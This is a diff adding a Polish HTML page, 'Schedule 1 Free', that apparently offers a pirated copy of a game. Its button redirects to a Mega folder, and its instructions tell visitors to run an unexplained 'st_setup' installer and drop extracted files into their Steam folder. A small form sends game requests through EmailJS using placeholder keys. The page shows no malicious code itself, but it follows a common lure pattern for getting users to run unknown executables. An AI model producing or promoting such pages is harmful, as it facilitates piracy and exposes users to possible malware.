@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Schedule 1 Free</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #000; /* Zmieniono na jednolite czarne tło */
+            color: white;
+        }
+        .container {
+            margin-top: 50px;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        button {
+            background-color: red;
+            color: black;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:active {
+            background-color: gray;
+            color: white;
+        }
+        .instructions {
+            margin-top: 20px;
+            text-align: left;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Schedule 1 Free</h1>
+        <button onclick="downloadFile()">Kliknij, aby pobrać</button>
+        <button onclick="requestGame()" style="position: absolute; top: 10px; right: 10px;">Prośba o grę</button>
+        <div id="requestForm" style="display:none; margin-top:20px;">
+            <h2>Prośba o grę</h2>
+            <form onsubmit="submitRequest(event)">
+                <label for="gameName">Nazwa gry:</label>
+                <input type="text" id="gameName" name="gameName" required>
+                <br><br>
+                <button type="submit">Wyślij prośbę</button>
+            </form>
+        </div>
+        <div class="instructions">
+            <h2>Jak pobrać:</h2>
+            <ol>
+                <li>Pobierz Steam. Jeśli już masz, uruchom go.</li>
+                <li>Pobierz pliki: <strong>st_setup</strong> i <strong>schedule</strong>.</li>
+                <li>Kliknij na pulpicie <strong>st_setup</strong> i zainstaluj.</li>
+                <li>Uruchom program i poczekaj.</li>
+                <li>Z plików <strong>schedule</strong> wyodrębnij lub wypakuj je na pulpit.</li>
+                <li>Przenieś te pliki do folderu z ikoną Steam (tzw. "oczko").</li>
+                <li>Uruchom ponownie Steam i gotowe!</li>
+            </ol>
+        </div>
+    </div>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("YOUR_USER_ID"); // Wstaw swój User ID z EmailJS
+        })();
+
+        function downloadFile() {
+            // Otwieranie linku do strony example.com
+            window.location.href = 'https://mega.nz/folder/B2MTQSpa#UR7Iwk6BRvC0fvKbMuNCqg';
+        }
+
+        function requestGame() {
+            const form = document.getElementById('requestForm');
+            form.style.display = form.style.display === 'none' ? 'block' : 'none';
+        }
+
+        function submitRequest(event) {
+            event.preventDefault();
+            const gameName = document.getElementById('gameName').value;
+
+            // Dane do wysłania
+            const templateParams = {
+                game_name: gameName,
+                user_email: "your_email@example.com" // Wstaw swój adres e-mail
+            };
+
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+                .then(function(response) {
+                    alert("Prośba została wysłana!");
+                    document.getElementById('requestForm').style.display = 'none';
+                }, function(error) {
+                    alert("Wystąpił błąd podczas wysyłania prośby: " + error.text);
+                });
+        }
+    </script>
+</body>
+</html>
